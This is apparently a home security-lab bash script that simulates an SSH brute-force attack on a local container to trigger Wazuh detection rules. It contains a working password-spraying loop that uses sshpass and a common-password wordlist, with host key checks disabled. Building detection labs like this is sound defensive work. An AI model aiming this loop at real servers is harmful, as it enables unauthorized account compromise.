#!/usr/bin/env bash
# 01-ssh-bruteforce.sh
# Simulates an SSH brute-force attack against the lab's Ubuntu target.
# Designed to trigger custom rules 100100 and 100101 in the Wazuh manager.
#
# Safety:
#   - Only targets the lab container on localhost:2222.
#   - The 'labuser' account exists only inside the lab.
#
# Requires: sshpass  (apt install sshpass / brew install hudochenkov/sshpass/sshpass)

set -euo pipefail

TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-2222}"
TARGET_USER="${TARGET_USER:-labuser}"

# Common-password wordlist - last entry is the lab's real password so
# rule 100101 fires (brute-force followed by success).
PASSWORDS=(
  "123456"
  "password"
  "admin"
  "letmein"
  "qwerty"
  "12345678"
  "welcome"
  "Password1"
)

command -v sshpass >/dev/null || {
  echo "sshpass not found - install it first"
  exit 1
}

echo "==> Spraying passwords against ${TARGET_USER}@${TARGET_HOST}:${TARGET_PORT}"
for pw in "${PASSWORDS[@]}"; do
  printf "    trying %-15s ... " "$pw"
  if sshpass -p "$pw" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=4 \
        -o LogLevel=ERROR \
        -p "$TARGET_PORT" \
        "${TARGET_USER}@${TARGET_HOST}" "exit" 2>/dev/null; then
    echo "SUCCESS"
  else
    echo "fail"
  fi
  sleep 1
done

echo
echo "Now check the Wazuh dashboard. Expected alerts:"
echo "  - rule 5710  (sshd authentication failed)         x several"
echo "  - rule 100100 (home-soc-lab brute-force)"
echo "  - rule 100101 (home-soc-lab brute-force + success) if Password1 worked"
